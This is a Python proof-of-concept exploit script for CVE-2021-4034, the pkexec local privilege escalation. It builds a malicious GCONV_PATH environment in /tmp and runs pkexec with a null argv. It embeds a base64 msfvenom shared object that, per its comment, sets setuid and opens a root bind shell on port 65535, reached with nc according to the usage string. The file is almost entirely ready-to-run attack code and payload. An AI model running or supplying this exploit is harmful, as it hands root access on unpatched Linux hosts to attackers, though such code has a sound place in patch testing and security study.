#!/usr/bin/env python3
from __future__ import annotations
from ctypes.util import find_library
from ctypes import CDLL, c_char_p, Array
from os.path import exists
from os import chmod, mkdir, rmdir, remove, chdir
from base64 import b64decode
from sys import exit, stdout, stderr, argv
from argparse import Namespace, ArgumentParser


# noinspection PyBroadException
class Exploit(object):
    def __init__(self, payload: str, exploit: str, library: str, authority: str, **kw):
        self.libc: CDLL = CDLL(find_library("c"))
        self.exploit: str = exploit
        self.library: str = library
        self.authority: str = authority
        self.payload: str = payload
        self.__dict__.update(**kw)

    @property
    def environ(self) -> Array:
        environ = [
            self.exploit.encode(),
            b"PATH=GCONV_PATH=.",
            b"LC_MESSAGES=en_US.UTF-8",
            f"XAUTHORITY=../{self.authority}".encode(),
            None
        ]
        pointer = (c_char_p * len(environ))()
        pointer[:] = environ
        return pointer

    def mkdir(self, path: str) -> Exploit:
        stdout.write(f"Creating directory: {path}\n")
        if not exists(path):
            mkdir(path)
        return self

    def write(self, path: str, value: bytes = b"") -> Exploit:
        stdout.write(f"Creating file: {path}\n")
        if exists(path):
            remove(path)
        open(path, "wb").write(value)
        chmod(path, 0o0755)
        return self

    def execute(self) -> Exploit:
        try:
            stdout.write(f"Starting CVE-2021-4034 exploit\n")
            chdir("/tmp/")

            stdout.write(f"Creating shared library with payload\n")
            self.write(f"{self.library}.so", b64decode(self.payload.encode()))

            stdout.write(f"Creating exploit directories\n")
            self.mkdir("GCONV_PATH=.")\
                .mkdir(self.exploit)

            stdout.write(f"Creating exploit files\n")
            self.write(f"GCONV_PATH=./{self.exploit}", b"")\
                .write(
                    f"{self.exploit}/gconv-modules",
                    f"module  UTF-8//    INTERNAL    ../{self.library}    2\n".encode()
                )

            stdout.write(f"Executing pkexec using malformed arguments\n")
            self.libc.execve(b"/usr/bin/pkexec", c_char_p(None), self.environ)
        except Exception as err:
            stderr.write(f"Error during exploitation: {err}\n")
            exit(1)
        return self

    @staticmethod
    def main(args: Namespace) -> Exploit:
        return Exploit(
            payload=args.payload,
            exploit=args.exploit,
            library=args.library,
            authority=args.authority
        ).execute()


if __name__ == '__main__':
    options = ArgumentParser(description="CVE-2021-4034 POC", add_help=True, usage=f"python3 {argv[0]} & nc -v 127.0.0.1 65535")
    defaultPayload: str = (
        # msfvenom -p linux/x64/shell_bind_tcp lhost=0.0.0.0 lport=65535 -f elf-so prependsetuid=true|base64
        "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC"
        "AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AEAAAAAAABOAgAAAAAAAAAQ"
        "AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA"
        "AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA"
        "AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA"
        "AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAASDH/amlYDwVqKViZagJfagFeDwVIl1LHBCQCAP//SInmahBaajFYDwVqMlgPBUgx9morWA8F"
        "SJdqA15I/85qIVgPBXX2ajtYmUi7L2Jpbi9zaABTSInnUldIieYPBQ=="
    )
    options.add_argument("-payload", action="store", default=defaultPayload, help="Base64 encoded .so payload")
    options.add_argument("-exploit", action="store", default="lab-cve-2021-4034", help="Name of exploit directory")
    options.add_argument("-library", action="store", default="lib-cve-2021-4034", help="Name of shared object")
    options.add_argument("-authority", action="store", default="PWN", help="Name of authority variable string")
    Exploit.main(options.parse_args())
    exit(0)